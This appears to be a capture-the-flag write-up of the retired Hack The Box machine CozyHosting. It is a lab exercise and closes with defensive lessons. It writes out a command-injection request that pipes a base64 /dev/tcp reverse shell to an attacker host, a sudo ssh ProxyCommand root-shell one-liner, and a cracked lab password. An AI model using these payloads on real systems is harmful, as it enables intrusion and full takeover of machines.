# CozyHosting

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.230 |
| **Status** | Retired |

## Overview
CozyHosting is an easy Linux machine running a Java **Spring Boot** hosting-management application. The application exposes Spring's `Actuator` endpoints, which leak a valid administrator session cookie and allow authenticated access to the admin dashboard. A host-management feature there is vulnerable to OS command injection, giving a reverse shell. The application's own JAR file contains hardcoded database credentials, which unlock a PostgreSQL database holding a hashed application password; cracking it and reusing it for SSH grants a low-privileged shell, and a misconfigured `sudo` SSH `ProxyCommand` entry is then abused to escalate directly to root.

## Reconnaissance
`nmap` against 10.10.11.230 (cozyhosting.htb) found:

```
22/tcp   open  ssh    OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp   open  http   nginx 1.18.0 (Ubuntu)   -> "Cozy Hosting - Home"
9000/tcp open  cslistener?
9001/tcp open  tor-orport?
```
A full-port scan (`nmap -p- -Pn -oN nmap/allports`) and a targeted scan of 9000/9001 (`nmap -sC -sV -p9000,9001`) confirmed no additional service banners on the two high ports beyond the generic nmap guesses shown above.

## Enumeration
Gobuster against `cozyhosting.htb` found:

```
/index    (Status: 200)
/login    (Status: 200)
/admin    (Status: 401)
/logout   (Status: 204)
/error    (Status: 500)
```

The `/error` and general application behavior were consistent with a Spring Boot backend. Spring Boot applications commonly expose `Actuator` management endpoints (e.g. `/actuator/sessions`, `/actuator/env`, `/actuator/mappings`) if not explicitly disabled or secured; enumerating these endpoints located a live administrator session identifier, which was replayed as a cookie to gain authenticated access to `/admin`.

## Foothold
Inside the authenticated admin dashboard, a "connect to host" / SSH-management feature POSTs to `/executessh` with `host` and `username` parameters used to build a backend SSH command. The `username` field is not sanitized, allowing shell metacharacters to be injected:

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Type: application/x-www-form-urlencoded

host=123&username=213;echo${IFS%??}"<base64-encoded-reverse-shell>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

The base64 blob decodes to a standard bash `/dev/tcp` reverse shell one-liner (`bash -i >& /dev/tcp/<attacker-ip>/9090 0>&1`). `${IFS%??}` is used in place of literal spaces to bypass basic space filtering. Sending this request executed the reverse shell as the application's service account.

## Privilege Escalation
The application's own JAR file (`cloudhosting-0.0.1.jar`) was pulled from the box and decompiled/inspected, revealing its Spring datasource configuration:

```
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=<hardcoded>
```

Logging into the local PostgreSQL instance with these credentials (`psql -p 5432 -U postgres -h 127.0.0.1`) exposed the application's `users` table, containing a BCrypt password hash. Cracking this hash offline recovered a plaintext password (`Vg&nvzAQ7XxR` per the notes) that was reused to SSH in as a real system user (`admin`/`kanderson`, per the box's known account).

Checking `sudo -l` for that user showed permission to run `ssh` with an attacker-controllable `ProxyCommand` option as root:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Because `ProxyCommand` lets OpenSSH's client execute an arbitrary shell command in place of establishing the actual network connection, and this invocation runs under `sudo`, the injected `sh` here spawns a root shell: completing the escalation.

## Lessons Learned
- Spring Boot `Actuator` endpoints must be locked down (authentication, network restriction, or fully disabled) in production: they routinely leak session tokens, environment variables, and internal configuration.
- Any user-controlled value used to build a shell command (even indirectly, e.g. an SSH `username`/`host` field) must be strictly validated/escaped; here it led directly to OS command injection.
- Never hardcode database credentials inside a shipped JAR/application artifact: anyone who can read the built application can trivially recover them via decompilation.
- `sudo` rules that allow `ssh` (or any tool supporting a generic command-execution hook like `ProxyCommand`) are equivalent to unrestricted root shell access; audit `sudo -l` entries against GTFOBins-style abuse before granting them.

## Tools & References
- `nmap`, `gobuster` for service and endpoint discovery.
- Spring Boot Actuator endpoint enumeration for session-cookie disclosure: a widely documented Spring Boot misconfiguration class.
- OS command injection via the `/executessh` host-management feature (base64-wrapped bash reverse shell, `${IFS%??}` space-filter bypass).
- A Java decompiler (e.g. `jd-gui`/`cfr`) to inspect `cloudhosting-0.0.1.jar` for hardcoded datasource credentials.
- `hashcat`/`john` to crack the recovered BCrypt application password hash.
- `sudo ssh -o ProxyCommand=...` privilege escalation: a documented GTFOBins technique for the `ssh` binary.
- `files/cloudhosting-0.0.1.jar` (~58MB compiled Spring Boot application JAR): omitted from the repository as a large compiled binary artifact; the specific hardcoded credentials it contained are reproduced above.
- `files/rs.flip` (a ~2.8MB compiled ELF reverse-shell binary): omitted from the repository as a compiled binary; the actual reverse shell used was the bash one-liner shown above.
